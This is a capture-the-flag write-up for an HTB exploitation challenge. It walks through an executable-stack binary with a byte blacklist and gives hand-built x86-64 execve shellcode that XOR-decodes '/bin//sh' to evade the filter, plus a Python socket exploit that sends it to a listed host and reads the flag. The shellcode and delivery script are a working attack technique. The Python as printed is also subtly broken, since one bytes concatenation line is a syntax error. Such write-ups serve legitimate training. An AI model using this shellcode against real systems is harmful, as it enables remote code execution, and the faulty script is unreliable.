---
ctf: HTBLabs
title: Execute
category: pwn
difficulty: unknown
tags: [shellcode, execstack, blacklist-bypass, x86-64]
flag_format: HTB{...}
date: 2026-08-11
---

# Execute

## Challenge

Can you feed the hungry code? IP:154.57.164.65:30760

## Approach

The program reads up to 60 bytes into a 62-byte stack buffer, checks the input
against a blacklist, and then calls the buffer as a function:

```c
int size = read(0, buf, 60);

if (!check(blacklist, buf, size, strlen(blacklist))) {
    exit(1337);
}

((void (*)())buf)();
```

The binary was compiled with `-z execstack`, so no return-address overwrite or
ROP chain is necessary. The bytes sent to the program can be executed directly
as shellcode.

### Blacklist

The forbidden bytes are:

```text
3b 54 62 69 6e 73 68 f6 d2 c0 5f c9 66 6c 61 67
 ;  T  b  i  n  s  h              _     f  l  a  g
```

The checker also contains an off-by-one error:

```c
for (int j = 0; j < size - 1; j++)
```

It never checks the final byte read. The exploit does not need to rely on this,
however, because every byte in the resulting shellcode avoids the blacklist.

### Building safe shellcode

A normal `execve("/bin/sh", ...)` payload contains several forbidden bytes.
The string `/bin//sh` was therefore XOR-encoded with `0x0d`:

```text
/bin//sh XOR 0x0d = 22 6f 64 63 22 22 7e 65
```

At runtime, the shellcode loads the encoded value and XORs it with
`0x0d0d0d0d0d0d0d0d`. It also avoids common instruction encodings containing
blacklisted bytes. For example, it loads syscall number 59 by pushing 60 and
decrementing it instead of embedding byte `0x3b` directly.

The final shellcode is 45 bytes long and contains no forbidden bytes.

### Exploit

```python
#!/usr/bin/env python3
import socket
import time

HOST = "154.57.164.65"
PORT = 30760

shellcode = (
    b"\xba\x00\x00\x00\x00"      # mov edx, 0
    b"\x52"                          # push rdx (string terminator)
    b"\x48\xbb\x22\x6f\x64\x63\x22\x22\x7e\x65"  # encoded /bin//sh
    b"\x48\xb9" + b"\x0d" * 8     # XOR key
    b"\x48\x31\xcb"                # xor rbx, rcx
    b"\x53"                          # push rbx
    b"\x48\x89\xe7"                # mov rdi, rsp
    b"\x52\x57"                     # argv = {rdi, NULL}
    b"\x48\x89\xe6"                # mov rsi, rsp
    b"\x6a\x3c\x58\xff\xc8"      # rax = 60 - 1 = 59
    b"\x0f\x05"                     # syscall
)

forbidden = bytes.fromhex("3b5462696e7368f6d2c05fc9666c6167")
assert len(shellcode) == 45
assert not any(byte in forbidden for byte in shellcode)

with socket.create_connection((HOST, PORT)) as sock:
    print(sock.recv(4096).decode(), end="")
    sock.sendall(shellcode)

    # Let the initial read return and the spawned shell begin reading stdin.
    time.sleep(0.3)
    sock.sendall(b"cat flag.txt\nexit\n")

    sock.settimeout(3)
    output = bytearray()
    try:
        while chunk := sock.recv(4096):
            output.extend(chunk)
    except TimeoutError:
        pass

    print(output.decode())
```

Output:

```text
Hey, just because I am hungry doesn't mean I'll execute everything
HTB{redacted}
```

## Tools

- `file` for identifying the ELF binary
- `nasm`/x86-64 instruction encodings for constructing shellcode
- Python sockets for delivering the payload and interacting with the shell

## Lessons

- An executable stack combined with a direct call to attacker-controlled input
  makes shellcode execution the intended primitive.
- Byte blacklists can be bypassed by decoding constants at runtime and choosing
  equivalent instruction encodings.
- Network shellcode and its follow-up commands must be sent separately. Sending
  both at once may cause the initial `read()` to consume command bytes as part of
  the shellcode.
- Carefully inspect loop boundaries: `size - 1` leaves the last byte unchecked.

## Flag

```text
HTB{redacted}
```
